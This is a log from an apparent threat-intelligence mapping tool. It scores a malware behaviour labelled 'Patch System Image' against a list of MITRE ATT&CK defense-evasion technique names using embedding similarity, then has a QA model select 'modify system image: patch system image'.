[2025-03-27 12:06:47,430 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification: group policy modification]: tensor([[0.3341]])
[2025-03-27 12:06:47,441 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [domain or tenant policy modification: trust modification]: tensor([[0.2839]])
[2025-03-27 12:06:47,454 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails]: tensor([[0.3897]])
[2025-03-27 12:06:47,465 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails: environmental keying]: tensor([[0.3376]])
[2025-03-27 12:06:47,480 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [execution guardrails: mutual exclusion]: tensor([[0.3372]])
[2025-03-27 12:06:47,491 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [exploitation for defense evasion]: tensor([[0.4577]])
[2025-03-27 12:06:47,503 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification]: tensor([[0.2561]])
[2025-03-27 12:06:47,515 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification: windows file and directory permissions modification]: tensor([[0.2830]])
[2025-03-27 12:06:47,527 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [file and directory permissions modification: linux and mac file and directory permissions modification]: tensor([[0.2631]])
[2025-03-27 12:06:47,540 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts]: tensor([[0.4899]])
[2025-03-27 12:06:47,556 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden files and directories]: tensor([[0.3469]])
[2025-03-27 12:06:47,573 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden users]: tensor([[0.3830]])
[2025-03-27 12:06:47,588 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden window]: tensor([[0.3962]])
[2025-03-27 12:06:47,603 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: ntfs file attributes]: tensor([[0.1931]])
[2025-03-27 12:06:47,617 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: hidden file system]: tensor([[0.2575]])
[2025-03-27 12:06:47,631 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: run virtual instance]: tensor([[0.3941]])
[2025-03-27 12:06:47,643 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: vba stomping]: tensor([[0.3333]])
[2025-03-27 12:06:47,657 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: email hiding rules]: tensor([[0.1861]])
[2025-03-27 12:06:47,672 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: resource forking]: tensor([[0.3807]])
[2025-03-27 12:06:47,685 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: process argument spoofing]: tensor([[0.3182]])
[2025-03-27 12:06:47,696 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: ignore process interrupts]: tensor([[0.2545]])
[2025-03-27 12:06:47,713 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hide artifacts: file/path exclusions]: tensor([[0.3413]])
[2025-03-27 12:06:47,725 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow]: tensor([[0.4079]])
[2025-03-27 12:06:47,736 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dll search order hijacking]: tensor([[0.3445]])
[2025-03-27 12:06:47,748 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dll side-loading]: tensor([[0.2415]])
[2025-03-27 12:06:47,765 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dylib hijacking]: tensor([[0.2563]])
[2025-03-27 12:06:47,780 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: executable installer file permissions weakness]: tensor([[0.4674]])
[2025-03-27 12:06:47,795 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: dynamic linker hijacking]: tensor([[0.3071]])
[2025-03-27 12:06:47,807 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by path environment variable]: tensor([[0.3275]])
[2025-03-27 12:06:47,819 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by search order hijacking]: tensor([[0.3556]])
[2025-03-27 12:06:47,829 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: path interception by unquoted path]: tensor([[0.2795]])
[2025-03-27 12:06:47,844 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: services file permissions weakness]: tensor([[0.5119]])
[2025-03-27 12:06:47,861 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: services registry permissions weakness]: tensor([[0.4701]])
[2025-03-27 12:06:47,875 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: cor_profiler]: tensor([[0.3181]])
[2025-03-27 12:06:47,887 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: kernelcallbacktable]: tensor([[0.4415]])
[2025-03-27 12:06:47,902 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [hijack execution flow: appdomainmanager]: tensor([[0.3256]])
[2025-03-27 12:06:47,913 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses]: tensor([[0.3509]])
[2025-03-27 12:06:47,926 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify tools]: tensor([[0.3933]])
[2025-03-27 12:06:47,937 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable windows event logging]: tensor([[0.3290]])
[2025-03-27 12:06:47,950 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: impair command history logging]: tensor([[0.2436]])
[2025-03-27 12:06:47,962 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify system firewall]: tensor([[0.4480]])
[2025-03-27 12:06:47,975 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: indicator blocking]: tensor([[0.3370]])
[2025-03-27 12:06:47,986 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify cloud firewall]: tensor([[0.2984]])
[2025-03-27 12:06:47,997 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify cloud logs]: tensor([[0.2626]])
[2025-03-27 12:06:48,010 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: safe mode boot]: tensor([[0.3173]])
[2025-03-27 12:06:48,020 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: downgrade attack]: tensor([[0.4182]])
[2025-03-27 12:06:48,032 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: spoof security alerting]: tensor([[0.3143]])
[2025-03-27 12:06:48,044 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impair defenses: disable or modify linux audit system]: tensor([[0.3617]])
[2025-03-27 12:06:48,057 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [impersonation]: tensor([[0.2489]])
[2025-03-27 12:06:48,069 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal]: tensor([[0.3676]])
[2025-03-27 12:06:48,080 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear windows event logs]: tensor([[0.3074]])
[2025-03-27 12:06:48,091 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear linux or mac system logs]: tensor([[0.3470]])
[2025-03-27 12:06:48,103 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear command history]: tensor([[0.3248]])
[2025-03-27 12:06:48,115 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: file deletion]: tensor([[0.3751]])
[2025-03-27 12:06:48,127 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: network share connection removal]: tensor([[0.2881]])
[2025-03-27 12:06:48,138 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: timestomp]: tensor([[0.2645]])
[2025-03-27 12:06:48,151 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear network connection history and configurations]: tensor([[0.3761]])
[2025-03-27 12:06:48,162 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear mailbox data]: tensor([[0.2250]])
[2025-03-27 12:06:48,175 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: clear persistence]: tensor([[0.3536]])
[2025-03-27 12:06:48,187 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indicator removal: relocate malware]: tensor([[0.4529]])
[2025-03-27 12:06:48,202 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [indirect command execution]: tensor([[0.1804]])
[2025-03-27 12:06:48,214 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading]: tensor([[0.4023]])
[2025-03-27 12:06:48,228 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: invalid code signature]: tensor([[0.3610]])
[2025-03-27 12:06:48,243 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: right-to-left override]: tensor([[0.3110]])
[2025-03-27 12:06:48,259 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: rename system utilities]: tensor([[0.4256]])
[2025-03-27 12:06:48,271 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade task or service]: tensor([[0.3281]])
[2025-03-27 12:06:48,286 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: match legitimate name or location]: tensor([[0.4188]])
[2025-03-27 12:06:48,299 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: space after filename]: tensor([[0.3225]])
[2025-03-27 12:06:48,314 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: double file extension]: tensor([[0.1151]])
[2025-03-27 12:06:48,329 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade file type]: tensor([[0.2499]])
[2025-03-27 12:06:48,342 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: break process trees]: tensor([[0.3689]])
[2025-03-27 12:06:48,354 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [masquerading: masquerade account name]: tensor([[0.1725]])
[2025-03-27 12:06:48,370 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process]: tensor([[0.4857]])
[2025-03-27 12:06:48,386 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: domain controller authentication]: tensor([[0.5034]])
[2025-03-27 12:06:48,397 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: password filter dll]: tensor([[0.4741]])
[2025-03-27 12:06:48,409 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: pluggable authentication modules]: tensor([[0.3948]])
[2025-03-27 12:06:48,420 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: network device authentication]: tensor([[0.6454]])
[2025-03-27 12:06:48,432 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: reversible encryption]: tensor([[0.3612]])
[2025-03-27 12:06:48,442 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: multi-factor authentication]: tensor([[0.4161]])
[2025-03-27 12:06:48,454 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: hybrid identity]: tensor([[0.4861]])
[2025-03-27 12:06:48,470 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: network provider dll]: tensor([[0.3794]])
[2025-03-27 12:06:48,481 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify authentication process: conditional access policies]: tensor([[0.3946]])
[2025-03-27 12:06:48,512 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure]: tensor([[0.4046]])
[2025-03-27 12:06:48,537 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: create snapshot]: tensor([[0.3304]])
[2025-03-27 12:06:48,551 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: create cloud instance]: tensor([[0.2640]])
[2025-03-27 12:06:48,564 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: delete cloud instance]: tensor([[0.3655]])
[2025-03-27 12:06:48,579 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: revert cloud instance]: tensor([[0.3755]])
[2025-03-27 12:06:48,594 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud compute infrastructure: modify cloud compute configurations]: tensor([[0.2915]])
[2025-03-27 12:06:48,607 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify cloud resource hierarchy]: tensor([[0.3524]])
[2025-03-27 12:06:48,620 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify registry]: tensor([[0.4612]])
[2025-03-27 12:06:48,632 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image]: tensor([[0.5955]])
[2025-03-27 12:06:48,645 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image: patch system image]: tensor([[0.6984]])
[2025-03-27 12:06:48,659 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [modify system image: downgrade system image]: tensor([[0.6273]])
[2025-03-27 12:06:48,672 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [network boundary bridging]: tensor([[0.1928]])
[2025-03-27 12:06:48,685 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [network boundary bridging: network address translation traversal]: tensor([[0.2758]])
[2025-03-27 12:06:48,698 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information]: tensor([[0.3636]])
[2025-03-27 12:06:48,711 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: binary padding]: tensor([[0.4316]])
[2025-03-27 12:06:48,729 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: software packing]: tensor([[0.3544]])
[2025-03-27 12:06:48,742 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: steganography]: tensor([[0.2174]])
[2025-03-27 12:06:48,757 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: compile after delivery]: tensor([[0.2868]])
[2025-03-27 12:06:48,771 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: indicator removal from tools]: tensor([[0.4487]])
[2025-03-27 12:06:48,788 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: html smuggling]: tensor([[0.2132]])
[2025-03-27 12:06:48,802 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: dynamic api resolution]: tensor([[0.3668]])
[2025-03-27 12:06:48,815 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: stripped payloads]: tensor([[0.2593]])
[2025-03-27 12:06:48,829 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: embedded payloads]: tensor([[0.3117]])
[2025-03-27 12:06:48,847 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: command obfuscation]: tensor([[0.2473]])
[2025-03-27 12:06:48,868 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: fileless storage]: tensor([[0.2270]])
[2025-03-27 12:06:48,883 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: lnk icon smuggling]: tensor([[0.3040]])
[2025-03-27 12:06:48,901 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: encrypted/encoded file]: tensor([[0.2914]])
[2025-03-27 12:06:48,920 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [obfuscated files or information: polymorphic code]: tensor([[0.3566]])
[2025-03-27 12:06:48,938 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [plist file modification]: tensor([[0.3783]])
[2025-03-27 12:06:48,951 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot]: tensor([[0.4668]])
[2025-03-27 12:06:48,966 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: system firmware]: tensor([[0.3333]])
[2025-03-27 12:06:48,979 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: component firmware]: tensor([[0.4807]])
[2025-03-27 12:06:48,991 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: bootkit]: tensor([[0.4020]])
[2025-03-27 12:06:49,003 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: rommonkit]: tensor([[0.4992]])
[2025-03-27 12:06:49,024 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [pre-os boot: tftp boot]: tensor([[0.3316]])
[2025-03-27 12:06:49,038 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection]: tensor([[0.3778]])
[2025-03-27 12:06:49,051 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: dynamic-link library injection]: tensor([[0.3725]])
[2025-03-27 12:06:49,064 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: portable executable injection]: tensor([[0.3803]])
[2025-03-27 12:06:49,076 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: thread execution hijacking]: tensor([[0.4268]])
[2025-03-27 12:06:49,090 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: asynchronous procedure call]: tensor([[0.3378]])
[2025-03-27 12:06:49,102 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: thread local storage]: tensor([[0.3599]])
[2025-03-27 12:06:49,116 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: ptrace system calls]: tensor([[0.3904]])
[2025-03-27 12:06:49,129 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: proc memory]: tensor([[0.4108]])
[2025-03-27 12:06:49,143 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: extra window memory injection]: tensor([[0.3592]])
[2025-03-27 12:06:49,155 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: process hollowing]: tensor([[0.3595]])
[2025-03-27 12:06:49,168 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: process doppelgänging]: tensor([[0.4234]])
[2025-03-27 12:06:49,181 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: vdso hijacking]: tensor([[0.3955]])
[2025-03-27 12:06:49,195 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [process injection: listplanting]: tensor([[0.4209]])
[2025-03-27 12:06:49,207 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [reflective code loading]: tensor([[0.2588]])
[2025-03-27 12:06:49,223 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [rogue domain controller]: tensor([[0.2757]])
[2025-03-27 12:06:49,243 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [rootkit]: tensor([[0.4777]])
[2025-03-27 12:06:49,260 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls]: tensor([[0.4208]])
[2025-03-27 12:06:49,278 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: gatekeeper bypass]: tensor([[0.3935]])
[2025-03-27 12:06:49,293 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: code signing]: tensor([[0.3100]])
[2025-03-27 12:06:49,313 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: sip and trust provider hijacking]: tensor([[0.3721]])
[2025-03-27 12:06:49,331 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: install root certificate]: tensor([[0.3119]])
[2025-03-27 12:06:49,350 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: mark-of-the-web bypass]: tensor([[0.3928]])
[2025-03-27 12:06:49,364 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [subvert trust controls: code signing policy modification]: tensor([[0.3515]])
[2025-03-27 12:06:49,379 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution]: tensor([[0.4331]])
[2025-03-27 12:06:49,396 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: compiled html file]: tensor([[0.3696]])
[2025-03-27 12:06:49,409 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: control panel]: tensor([[0.4095]])
[2025-03-27 12:06:49,423 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: cmstp]: tensor([[0.3515]])
[2025-03-27 12:06:49,441 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: installutil]: tensor([[0.3449]])
[2025-03-27 12:06:49,455 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mshta]: tensor([[0.3994]])
[2025-03-27 12:06:49,469 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: msiexec]: tensor([[0.4095]])
[2025-03-27 12:06:49,484 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: odbcconf]: tensor([[0.2296]])
[2025-03-27 12:06:49,497 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: regsvcs/regasm]: tensor([[0.4583]])
[2025-03-27 12:06:49,511 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: regsvr32]: tensor([[0.4516]])
[2025-03-27 12:06:49,529 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: rundll32]: tensor([[0.3089]])
[2025-03-27 12:06:49,542 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: verclsid]: tensor([[0.4150]])
[2025-03-27 12:06:49,556 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mavinject]: tensor([[0.4448]])
[2025-03-27 12:06:49,573 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: mmc]: tensor([[0.4091]])
[2025-03-27 12:06:49,588 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system binary proxy execution: electron applications]: tensor([[0.1672]])
[2025-03-27 12:06:49,602 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution]: tensor([[0.3734]])
[2025-03-27 12:06:49,619 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution: pubprn]: tensor([[0.2622]])
[2025-03-27 12:06:49,636 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [system script proxy execution: syncappvpublishingserver]: tensor([[0.3361]])
[2025-03-27 12:06:49,654 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [template injection]: tensor([[0.3057]])
[2025-03-27 12:06:49,674 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling]: tensor([[0.2094]])
[2025-03-27 12:06:49,688 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling: port knocking]: tensor([[0.2208]])
[2025-03-27 12:06:49,705 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [traffic signaling: socket filters]: tensor([[0.1820]])
[2025-03-27 12:06:49,718 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution]: tensor([[0.3196]])
[2025-03-27 12:06:49,731 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution: msbuild]: tensor([[0.3280]])
[2025-03-27 12:06:49,749 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [trusted developer utilities proxy execution: clickonce]: tensor([[0.3747]])
[2025-03-27 12:06:49,761 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [unused/unsupported cloud regions]: tensor([[0.2011]])
[2025-03-27 12:06:49,774 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material]: tensor([[0.4223]])
[2025-03-27 12:06:49,786 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: application access token]: tensor([[0.3709]])
[2025-03-27 12:06:49,800 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: pass the hash]: tensor([[0.3076]])
[2025-03-27 12:06:49,814 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: pass the ticket]: tensor([[0.1777]])
[2025-03-27 12:06:49,828 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: web session cookie]: tensor([[0.3268]])
[2025-03-27 12:06:49,846 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts]: tensor([[0.3704]])
[2025-03-27 12:06:49,861 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: default accounts]: tensor([[0.2585]])
[2025-03-27 12:06:49,875 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: domain accounts]: tensor([[0.2591]])
[2025-03-27 12:06:49,887 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: local accounts]: tensor([[0.2808]])
[2025-03-27 12:06:49,901 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.1902]])
[2025-03-27 12:06:49,919 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3974]])
[2025-03-27 12:06:49,937 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.4260]])
[2025-03-27 12:06:49,955 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.4283]])
[2025-03-27 12:06:49,970 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3458]])
[2025-03-27 12:06:49,981 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption]: tensor([[0.1793]])
[2025-03-27 12:06:49,993 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption: reduce key space]: tensor([[0.2084]])
[2025-03-27 12:06:50,005 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption: disable crypto hardware]: tensor([[0.3416]])
[2025-03-27 12:06:50,019 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [xsl script processing]: tensor([[0.1061]])
[2025-03-27 12:06:50,022 INFO] ++ Scores: [('modify system image: patch system image', tensor([[0.6984]])), ('modify authentication process: network device authentication', tensor([[0.6454]])), ('modify system image: downgrade system image', tensor([[0.6273]])), ('modify system image', tensor([[0.5955]])), ('hijack execution flow: services file permissions weakness', tensor([[0.5119]]))]
[2025-03-27 12:06:50,022 INFO] ++ Similar techniques found:
['modify system image: patch system image', 'modify authentication process: network device authentication', 'modify system image: downgrade system image', 'modify system image', 'hijack execution flow: services file permissions weakness']
[2025-03-27 12:06:50,022 INFO] ++ Querying the QA model for action Modify System Image: Patch System Image as used by the malware with the following context:
modify system image: patch system image
modify authentication process: network device authentication
modify system image: downgrade system image
modify system image
hijack execution flow: services file permissions weakness
[2025-03-27 12:06:50,881 INFO] ++ QA suggested technique: modify system image: patch system image
[2025-03-27 12:06:50,881 INFO] ++ Selected technique: modify system image: patch system image
[2025-03-27 12:06:54,629 INFO] ++ Refining the action: Modify System Image: Patch System Image as used by the malware using 9 documents:
